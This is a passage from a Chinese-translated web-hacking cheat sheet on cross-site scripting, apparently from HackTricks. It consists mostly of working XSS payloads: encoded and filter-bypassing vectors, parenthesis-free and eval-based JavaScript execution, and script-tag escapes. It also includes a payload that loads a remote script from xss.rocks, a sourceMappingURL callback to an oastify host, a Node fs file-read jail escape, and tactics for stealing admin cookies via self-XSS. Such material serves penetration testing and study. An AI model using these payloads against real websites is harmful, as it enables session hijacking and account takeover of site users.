<p>你可以在 <code>iframe</code> 的 <code>src</code> 属性中（至少）使用 <strong>十六进制</strong> 和 <strong>八进制编码</strong> 来声明 <strong>HTML 标签以执行 JS</strong>：</p>
<pre><code class="language-javascript">//Encoded: &lt;svg onload=alert(1)&gt;
// This WORKS
&lt;iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' /&gt;
&lt;iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' /&gt;

//Encoded: alert(1)
// This doesn't work
&lt;svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' /&gt;
&lt;svg onload=javascript:'\141\154\145\162\164\50\61\51' /&gt;
</code></pre>
<h3 id="反向标签窃取"><a class="header" href="#反向标签窃取">反向标签窃取</a></h3>
<pre><code class="language-javascript">&lt;a target="_blank" rel="opener"
</code></pre>
<p>如果您可以在任意 <strong><code>&lt;a href=</code></strong> 标签中注入任何 URL，并且该标签包含 <strong><code>target="_blank" 和 rel="opener"</code></strong> 属性，请查看 <strong>以下页面以利用此行为</strong>：</p>
<p>{% content-ref url="../reverse-tab-nabbing.md" %}
<a href="../reverse-tab-nabbing.html">reverse-tab-nabbing.md</a>
{% endcontent-ref %}</p>
<h3 id="事件处理程序绕过"><a class="header" href="#事件处理程序绕过">事件处理程序绕过</a></h3>
<p>首先检查此页面 (<a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a>) 以获取有用的 <strong>"on" 事件处理程序</strong>。<br />
如果有某些黑名单阻止您创建这些事件处理程序，您可以尝试以下绕过：</p>
<pre><code class="language-javascript">&lt;svg onload%09=alert(1)&gt; //No safari
&lt;svg %09onload=alert(1)&gt;
&lt;svg %09onload%20=alert(1)&gt;
&lt;svg onload%09%20%28%2c%3b=alert(1)&gt;

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
</code></pre>
<h3 id="xss-in-unexploitable-tags-hidden-input-link-canonical-meta"><a class="header" href="#xss-in-unexploitable-tags-hidden-input-link-canonical-meta">XSS in "Unexploitable tags" (hidden input, link, canonical, meta)</a></h3>
<p>从 <a href="https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags"><strong>这里</strong></a> <strong>现在可以滥用隐藏输入：</strong></p>
<pre><code class="language-html">&lt;button popvertarget="x"&gt;Click me&lt;/button&gt;
&lt;input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)&gt;
</code></pre>
<p>在<strong>meta标签</strong>中：</p>
<pre><code class="language-html">&lt;!-- Injection inside meta attribute--&gt;
&lt;meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) /&gt;
&lt;!-- Existing target--&gt;
&lt;button popovertarget="newsletter"&gt;Subscribe to newsletter&lt;/button&gt;
&lt;div popover id="newsletter"&gt;Newsletter popup&lt;/div&gt;
</code></pre>
<p>从 <a href="https://portswigger.net/research/xss-in-hidden-input-fields"><strong>这里</strong></a>：只要你能 <strong>说服</strong> <strong>受害者</strong> 按下 <strong>键组合</strong>，你就可以在 <strong>隐藏属性</strong> 中执行 <strong>XSS 载荷</strong>。在 Firefox Windows/Linux 上，键组合是 <strong>ALT+SHIFT+X</strong>，而在 OS X 上是 <strong>CTRL+ALT+X</strong>。你可以使用访问键属性中的不同键指定不同的键组合。这里是向量：</p>
<pre><code class="language-markup">&lt;input type="hidden" accesskey="X" onclick="alert(1)"&gt;
</code></pre>
<p><strong>XSS有效载荷将类似于：<code>" accesskey="x" onclick="alert(1)" x="</code></strong></p>
<h3 id="黑名单绕过-1"><a class="header" href="#黑名单绕过-1">黑名单绕过</a></h3>
<p>本节中已经揭示了几种使用不同编码的技巧。请<strong>返回学习您可以使用的内容：</strong></p>
<ul>
<li><strong>HTML编码（HTML标签）</strong></li>
<li><strong>Unicode编码（可以是有效的JS代码）：</strong> <code>\u0061lert(1)</code></li>
<li><strong>URL编码</strong></li>
<li><strong>十六进制和八进制编码</strong></li>
<li><strong>数据编码</strong></li>
</ul>
<p><strong>HTML标签和属性的绕过</strong></p>
<p>阅读<a href="./#blacklist-bypasses">上一节的黑名单绕过</a>。</p>
<p><strong>JavaScript代码的绕过</strong></p>
<p>阅读<a href="./#javascript-bypass-blacklists-techniques">下一节的JavaScript绕过黑名单</a>。</p>
<h3 id="css小工具"><a class="header" href="#css小工具">CSS小工具</a></h3>
<p>如果您在网络的<strong>非常小的部分</strong>发现了<strong>XSS</strong>，并且需要某种交互（可能是页脚中的一个小链接，带有onmouseover元素），您可以尝试<strong>修改该元素占据的空间</strong>以最大化触发链接的概率。</p>
<p>例如，您可以在元素中添加一些样式，如：<code>position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5</code></p>
<p>但是，如果WAF正在过滤样式属性，您可以使用CSS样式小工具，因此如果您发现，例如</p>
<blockquote>
<p>.test {display:block; color: blue; width: 100%}</p>
</blockquote>
<p>和</p>
<blockquote>
<p>#someid {top: 0; font-family: Tahoma;}</p>
</blockquote>
<p>现在您可以修改我们的链接并将其带入形式</p>
<blockquote>
<p>&lt;a href="" id=someid class=test onclick=alert() a=""&gt;</p>
</blockquote>
<p>这个技巧来自于<a href="https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703">https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703</a></p>
<h2 id="在javascript代码中注入"><a class="header" href="#在javascript代码中注入">在JavaScript代码中注入</a></h2>
<p>在这些情况下，您的<strong>输入</strong>将<strong>反映在.js文件的JS代码</strong>中，或在<code>&lt;script&gt;...&lt;/script&gt;</code>标签之间，或在可以执行JS代码的HTML事件之间，或在接受<code>javascript:</code>协议的属性之间。</p>
<h3 id="转义script标签"><a class="header" href="#转义script标签">转义&lt;script&gt;标签</a></h3>
<p>如果您的代码插入在<code>&lt;script&gt; [...] var input = 'reflected data' [...] &lt;/script&gt;</code>中，您可以轻松地**转义关闭<code>&lt;script&gt;</code>**标签：</p>
<pre><code class="language-javascript">&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;
</code></pre>
<p>注意，在这个例子中我们<strong>甚至没有关闭单引号</strong>。这是因为<strong>HTML 解析首先由浏览器执行</strong>，这涉及到识别页面元素，包括脚本块。解析 JavaScript 以理解和执行嵌入的脚本是在之后进行的。</p>
<h3 id="inside-js-code"><a class="header" href="#inside-js-code">Inside JS code</a></h3>
<p>如果 <code>&lt;&gt;</code> 被清理，你仍然可以<strong>转义字符串</strong>，在你的输入<strong>所在的位置</strong>并<strong>执行任意 JS</strong>。修复 JS 语法是很重要的，因为如果有任何错误，JS 代码将不会被执行：</p>
<pre><code>'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
</code></pre>
<h3 id="模板字面量-"><a class="header" href="#模板字面量-">模板字面量 ``</a></h3>
<p>为了构造 <strong>字符串</strong>，除了单引号和双引号，JS 还接受 <strong>反引号</strong> <strong><code>``</code></strong>。这被称为模板字面量，因为它们允许使用 <code>${ ... }</code> 语法 <strong>嵌入 JS 表达式</strong>。<br />
因此，如果你发现你的输入在使用反引号的 JS 字符串中被 <strong>反射</strong>，你可以利用语法 <code>${ ... }</code> 来执行 <strong>任意 JS 代码</strong>：</p>
<p>这可以通过以下方式 <strong>滥用</strong>：</p>
<pre><code class="language-javascript">`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`
</code></pre>
<pre><code class="language-javascript">// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````
</code></pre>
<h3 id="编码代码执行"><a class="header" href="#编码代码执行">编码代码执行</a></h3>
<pre><code class="language-markup">&lt;script&gt;\u0061lert(1)&lt;/script&gt;
&lt;svg&gt;&lt;script&gt;alert&amp;lpar;'1'&amp;rpar;
&lt;svg&gt;&lt;script&gt;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&lt;/script&gt;&lt;/svg&gt;  &lt;!-- The svg tags are neccesary
&lt;iframe srcdoc="&lt;SCRIPT&gt;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&lt;/iframe&gt;"&gt;
</code></pre>
<h3 id="unicode-编码-js-执行"><a class="header" href="#unicode-编码-js-执行">Unicode 编码 JS 执行</a></h3>
<pre><code class="language-javascript">\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
</code></pre>
<h3 id="javascript-绕过黑名单技术"><a class="header" href="#javascript-绕过黑名单技术">JavaScript 绕过黑名单技术</a></h3>
<p><strong>字符串</strong></p>
<pre><code class="language-javascript">"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
</code></pre>
<p><strong>特殊转义</strong></p>
<pre><code class="language-javascript">'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
// Any other char escaped is just itself
</code></pre>
<p><strong>JS代码中的空格替换</strong></p>
<pre><code class="language-javascript">&lt;TAB&gt;
/**/
</code></pre>
<p><strong>JavaScript 注释 (来自</strong> <a href="./#javascript-comments"><strong>JavaScript 注释</strong></a> <strong>技巧)</strong></p>
<pre><code class="language-javascript">//This is a 1 line comment
/* This is a multiline comment*/
&lt;!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
--&gt;This is a 1 line comment, but "--&gt;" must to be at the beggining of the first line
</code></pre>
<p><strong>JavaScript 新行（来自</strong> <a href="./#javascript-new-lines"><strong>JavaScript 新行</strong></a> <strong>技巧）</strong></p>
<pre><code class="language-javascript">//Javascript interpret as new line these chars:
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9
</code></pre>
<p><strong>JavaScript 空格</strong></p>
<pre><code class="language-javascript">log=[];
function funct(){}
for(let i=0;i&lt;=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
&lt;img/src/onerror=alert&amp;#65279;(1)&gt;
</code></pre>
<p><strong>在注释中的Javascript</strong></p>
<pre><code class="language-javascript">//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
</code></pre>
<p><strong>没有括号的JavaScript</strong></p>
<pre><code class="language-javascript">// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x```

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
&lt;img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'"&gt;
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.
</code></pre>
<ul>
<li><a href="https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md">https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md</a></li>
<li><a href="https://portswigger.net/research/javascript-without-parentheses-using-dommatrix">https://portswigger.net/research/javascript-without-parentheses-using-dommatrix</a></li>
</ul>
<p><strong>任意函数（alert）调用</strong></p>
<pre><code class="language-javascript">//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
&lt;svg&gt;&lt;animate onbegin=alert() attributeName=x&gt;&lt;/svg&gt;
</code></pre>
<h2 id="dom-漏洞"><a class="header" href="#dom-漏洞"><strong>DOM 漏洞</strong></a></h2>
<p>有 <strong>JS 代码</strong> 使用 <strong>由攻击者控制的不安全数据</strong>，如 <code>location.href</code>。攻击者可以利用这一点执行任意的 JS 代码。<br />
<strong>由于对</strong> <a href="dom-xss.html"><strong>DOM 漏洞的解释扩展，已移至此页面</strong></a><strong>:</strong></p>
<p>{% content-ref url="dom-xss.md" %}
<a href="dom-xss.html">dom-xss.md</a>
{% endcontent-ref %}</p>
<p>在这里你会找到关于 <strong>DOM 漏洞是什么、如何引发以及如何利用它们的详细解释</strong>。<br />
此外，别忘了在 <strong>提到的帖子末尾</strong> 你可以找到关于 <a href="dom-xss.html#dom-clobbering"><strong>DOM Clobbering 攻击</strong></a> 的解释。</p>
<h3 id="升级自我-xss"><a class="header" href="#升级自我-xss">升级自我 XSS</a></h3>
<h3 id="cookie-xss"><a class="header" href="#cookie-xss">Cookie XSS</a></h3>
<p>如果你可以通过在 cookie 中发送有效负载来触发 XSS，这通常是自我 XSS。然而，如果你发现一个 <strong>易受 XSS 攻击的子域名</strong>，你可以利用这个 XSS 在整个域中注入一个 cookie，从而在主域或其他子域（易受 cookie XSS 攻击的那些）中触发 cookie XSS。为此，你可以使用 cookie 投掷攻击：</p>
<p>{% content-ref url="../hacking-with-cookies/cookie-tossing.md" %}
<a href="../hacking-with-cookies/cookie-tossing.html">cookie-tossing.md</a>
{% endcontent-ref %}</p>
<p>你可以在 <a href="https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html"><strong>这篇博客文章</strong></a> 中找到对这一技术的极佳利用。</p>
<h3 id="将你的会话发送给管理员"><a class="header" href="#将你的会话发送给管理员">将你的会话发送给管理员</a></h3>
<p>也许用户可以与管理员共享他的个人资料，如果自我 XSS 在用户的个人资料中，而管理员访问了它，他将触发该漏洞。</p>
<h3 id="会话镜像"><a class="header" href="#会话镜像">会话镜像</a></h3>
<p>如果你发现一些自我 XSS，并且网页有 <strong>管理员的会话镜像</strong>，例如允许客户请求帮助，为了帮助你，管理员将看到你在你的会话中看到的内容，但从他的会话中。</p>
<p>你可以让 <strong>管理员触发你的自我 XSS</strong> 并窃取他的 cookies/会话。</p>
<h2 id="其他绕过"><a class="header" href="#其他绕过">其他绕过</a></h2>
<h3 id="规范化-unicode"><a class="header" href="#规范化-unicode">规范化 Unicode</a></h3>
<p>你可以检查 <strong>反射值</strong> 是否在服务器（或客户端）中 <strong>进行 Unicode 规范化</strong>，并利用此功能绕过保护。 <a href="../unicode-injection/#xss-cross-site-scripting"><strong>在这里找到一个例子</strong></a>。</p>
<h3 id="php-filter_validate_email-标志绕过"><a class="header" href="#php-filter_validate_email-标志绕过">PHP FILTER_VALIDATE_EMAIL 标志绕过</a></h3>
<pre><code class="language-javascript">"&gt;&lt;svg/onload=confirm(1)&gt;"@x.y
</code></pre>
<h3 id="ruby-on-rails-绕过"><a class="header" href="#ruby-on-rails-绕过">Ruby-On-Rails 绕过</a></h3>
<p>由于 <strong>RoR 大量赋值</strong>，引号被插入到 HTML 中，然后绕过引号限制，可以在标签内添加额外字段（onfocus）。<br />
表单示例（<a href="https://hackerone.com/reports/709336">来自此报告</a>），如果您发送有效负载：</p>
<pre><code>contact[email] onfocus=javascript:alert('xss') autofocus a=a&amp;form_type[a]aaa
</code></pre>
<p>该对 "Key","Value" 将被回显如下：</p>
<pre><code>{" onfocus=javascript:alert(&amp;#39;xss&amp;#39;) autofocus a"=&gt;"a"}
</code></pre>
<p>然后，将插入 onfocus 属性，并发生 XSS。</p>
<h3 id="特殊组合"><a class="header" href="#特殊组合">特殊组合</a></h3>
<pre><code class="language-markup">&lt;iframe/src="data:text/html,&lt;svg onload=alert(1)&gt;"&gt;
&lt;input type=image src onerror="prompt(1)"&gt;
&lt;svg onload=alert(1)//
&lt;img src="/" =_=" title="onerror='prompt(1)'"&gt;
&lt;img src='1' onerror='alert(0)' &lt;
&lt;script x&gt; alert(1) &lt;/script 1=2
&lt;script x&gt;alert('XSS')&lt;script y&gt;
&lt;svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
&lt;svg////////onload=alert(1)&gt;
&lt;svg id=x;onload=alert(1)&gt;
&lt;svg id=`x`onload=alert(1)&gt;
&lt;img src=1 alt=al lang=ert onerror=top[alt+lang](0)&gt;
&lt;script&gt;$=1,alert($)&lt;/script&gt;
&lt;script ~~~&gt;confirm(1)&lt;/script ~~~&gt;
&lt;script&gt;$=1,\u0061lert($)&lt;/script&gt;
&lt;&lt;/script/script&gt;&lt;script&gt;eval('\\u'+'0061'+'lert(1)')//&lt;/script&gt;
&lt;&lt;/script/script&gt;&lt;script ~~~&gt;\u0061lert(1)&lt;/script ~~~&gt;
&lt;/style&gt;&lt;/scRipt&gt;&lt;scRipt&gt;alert(1)&lt;/scRipt&gt;
&lt;img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)&gt;
&lt;svg&gt;&lt;x&gt;&lt;script&gt;alert('1'&amp;#41&lt;/x&gt;
&lt;iframe src=""/srcdoc='&lt;svg onload=alert(1)&gt;'&gt;
&lt;svg&gt;&lt;animate onbegin=alert() attributeName=x&gt;&lt;/svg&gt;
&lt;img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)&gt;
&lt;img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);"&gt;
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
</code></pre>
<h3 id="xss与302响应中的头部注入"><a class="header" href="#xss与302响应中的头部注入">XSS与302响应中的头部注入</a></h3>
<p>如果你发现可以<strong>在302重定向响应中注入头部</strong>，你可以尝试<strong>让浏览器执行任意JavaScript</strong>。这<strong>并不简单</strong>，因为现代浏览器在HTTP响应状态码为302时不会解释HTTP响应体，因此仅仅一个跨站脚本有效负载是无用的。</p>
<p>在<a href="https://www.gremwell.com/firefox-xss-302"><strong>这份报告</strong></a>和<a href="https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/"><strong>这份报告</strong></a>中，你可以阅读如何在Location头部测试多个协议，并查看其中是否有任何协议允许浏览器检查并执行体内的XSS有效负载。<br />
已知的过去协议：<code>mailto://</code>、<code>//x:1/</code>、<code>ws://</code>、<code>wss://</code>、<em>空Location头</em>、<code>resource://</code>。</p>
<h3 id="仅限字母数字和点"><a class="header" href="#仅限字母数字和点">仅限字母、数字和点</a></h3>
<p>如果你能够指示javascript将要<strong>执行</strong>的<strong>回调</strong>仅限于这些字符。<a href="./#javascript-function"><strong>阅读这篇文章的这一部分</strong></a>以了解如何滥用这种行为。</p>
<h3 id="有效的script内容类型以进行xss"><a class="header" href="#有效的script内容类型以进行xss">有效的<code>&lt;script&gt;</code>内容类型以进行XSS</a></h3>
<p>（来自<a href="https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/"><strong>这里</strong></a>）如果你尝试加载一个<strong>内容类型</strong>为<code>application/octet-stream</code>的脚本，Chrome将抛出以下错误：</p>
<blockquote>
<p>拒绝从‘<a href="https://uploader.c.hc.lc/uploads/xxx&#x27;">https://uploader.c.hc.lc/uploads/xxx'</a>执行脚本，因为其MIME类型（‘application/octet-stream’）不可执行，并且启用了严格的MIME类型检查。</p>
</blockquote>
<p>唯一支持Chrome运行<strong>加载脚本</strong>的<strong>Content-Type</strong>是来自<a href="https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc">https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc</a>中的常量**<code>kSupportedJavascriptTypes</code>**。</p>
<pre><code class="language-c">const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

</code></pre>
<h3 id="script-types-to-xss"><a class="header" href="#script-types-to-xss">Script Types to XSS</a></h3>
<p>(来自 <a href="https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/"><strong>这里</strong></a>) 那么，哪些类型可以指示加载脚本？</p>
<pre><code class="language-html">&lt;script type="???"&gt;&lt;/script&gt;
</code></pre>
<ul>
<li><strong>module</strong> (默认，无需解释)</li>
<li><a href="https://web.dev/web-bundles/"><strong>webbundle</strong></a>: Web Bundles 是一个功能，您可以将一堆数据（HTML、CSS、JS…）打包到一个 <strong><code>.wbn</code></strong> 文件中。</li>
</ul>
<pre><code class="language-html">&lt;script type="webbundle"&gt;
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
&lt;/script&gt;
The resources are loaded from the source .wbn, not accessed via HTTP
</code></pre>
<ul>
<li><a href="https://github.com/WICG/import-maps"><strong>importmap</strong></a><strong>:</strong> 允许改进导入语法</li>
</ul>
<pre><code class="language-html">&lt;script type="importmap"&gt;
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
&lt;/script&gt;

&lt;!-- With importmap you can do the following --&gt;
&lt;script&gt;
import moment from "moment";
import { partition } from "lodash";
&lt;/script&gt;
</code></pre>
<p>这种行为在 <a href="https://github.com/zwade/yaca/tree/master/solution"><strong>这篇文章</strong></a> 中被用来重新映射一个库到 eval，以滥用它可以触发 XSS。</p>
<ul>
<li><a href="https://github.com/WICG/nav-speculation"><strong>speculationrules</strong></a><strong>:</strong> 这个功能主要是为了解决一些由预渲染引起的问题。它的工作原理如下：</li>
</ul>
<pre><code class="language-html">&lt;script type="speculationrules"&gt;
{
"prerender": [
{"source": "list",
"urls": ["/page/2"],
"score": 0.5},
{"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1}
]
}
&lt;/script&gt;
</code></pre>
<h3 id="web-content-types-to-xss"><a class="header" href="#web-content-types-to-xss">Web Content-Types to XSS</a></h3>
<p>(来自 <a href="https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/"><strong>这里</strong></a>) 以下内容类型可以在所有浏览器中执行 XSS：</p>
<ul>
<li>text/html</li>
<li>application/xhtml+xml</li>
<li>application/xml</li>
<li>text/xml</li>
<li>image/svg+xml</li>
<li>text/plain (?? 不在列表中，但我认为我在 CTF 中见过这个)</li>
<li>application/rss+xml (关闭)</li>
<li>application/atom+xml (关闭)</li>
</ul>
<p>在其他浏览器中，其他 <strong><code>Content-Types</code></strong> 可以用来执行任意 JS，查看: <a href="https://github.com/BlackFan/content-type-research/blob/master/XSS.md">https://github.com/BlackFan/content-type-research/blob/master/XSS.md</a></p>
<h3 id="xml-content-type"><a class="header" href="#xml-content-type">xml Content Type</a></h3>
<p>如果页面返回的是 text/xml 内容类型，可以指示一个命名空间并执行任意 JS：</p>
<pre><code class="language-xml">&lt;xml&gt;
&lt;text&gt;hello&lt;img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /&gt;&lt;/text&gt;
&lt;/xml&gt;

&lt;!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. --&gt;
</code></pre>
<h3 id="特殊替换模式"><a class="header" href="#特殊替换模式">特殊替换模式</a></h3>
<p>当使用类似 <strong><code>"some {{template}} data".replace("{{template}}", &lt;user_input&gt;)</code></strong> 的代码时，攻击者可以使用 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement"><strong>特殊字符串替换</strong></a> 来尝试绕过某些保护措施：<code>"123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"}))</code></p>
<p>例如在 <a href="https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA"><strong>这篇文章</strong></a> 中，这被用来 <strong>转义一个 JSON 字符串</strong> 在脚本中并执行任意代码。</p>
<h3 id="chrome-缓存到-xss"><a class="header" href="#chrome-缓存到-xss">Chrome 缓存到 XSS</a></h3>
<p>{% content-ref url="chrome-cache-to-xss.md" %}
<a href="chrome-cache-to-xss.html">chrome-cache-to-xss.md</a>
{% endcontent-ref %}</p>
<h3 id="xs-监狱逃逸"><a class="header" href="#xs-监狱逃逸">XS 监狱逃逸</a></h3>
<p>如果您只能使用有限的字符集，请查看这些其他有效的解决方案以解决 XSJail 问题：</p>
<pre><code class="language-javascript">// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
